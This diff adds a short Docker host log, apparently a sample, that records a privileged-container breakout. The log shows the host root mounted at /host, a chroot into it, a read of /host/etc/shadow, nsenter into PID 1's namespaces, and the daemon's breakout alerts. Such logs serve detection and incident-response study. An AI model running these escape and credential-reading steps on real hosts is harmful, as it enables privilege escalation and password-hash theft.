@@ -1,0 +1,19 @@
+Feb 15 16:30:01 dockerhost dockerd[7101]: container start 9f3c2ab4e1c2 (image=ubuntu:latest, privileged=true)
+Feb 15 16:30:02 dockerhost dockerd[7101]: container 9f3c2ab4e1c2 mounted volume /:/host (rw)
+
+Feb 15 16:30:05 dockerhost audit[7120]: EXECVE argc=3 a0="/bin/bash" a1="-c" a2="chroot /host /bin/bash"
+Feb 15 16:30:05 dockerhost audit[7120]: SYSCALL arch=c000003e syscall=59 success=yes exit=0 auid=0 uid=0 gid=0 comm="bash" exe="/usr/bin/bash"
+
+Feb 15 16:30:07 dockerhost syslog: bash[7120]: chroot executed to /host
+Feb 15 16:30:08 dockerhost audit[7122]: PATH item=0 name="/host/etc/shadow" inode=40122 dev=08:01 mode=0100640 ouid=0 ogid=42
+
+Feb 15 16:30:10 dockerhost kernel: overlayfs: attempt to access host filesystem from container 9f3c2ab4e1c2
+Feb 15 16:30:11 dockerhost audit[7125]: EXECVE argc=2 a0="/bin/cat" a1="/host/etc/shadow"
+
+Feb 15 16:30:15 dockerhost dockerd[7101]: warning: container 9f3c2ab4e1c2 running with --privileged flag
+Feb 15 16:30:16 dockerhost dockerd[7101]: security alert: potential container breakout detected (PID namespace escape)
+
+Feb 15 16:30:20 dockerhost audit[7130]: EXECVE argc=2 a0="/usr/bin/nsenter" a1="--target 1 --mount --uts --ipc --net --pid"
+Feb 15 16:30:21 dockerhost syslog: nsenter[7130]: entered host namespaces successfully
+
+Feb 15 16:30:25 dockerhost dockerd[7101]: container stop 9f3c2ab4e1c2 (exitCode=0)
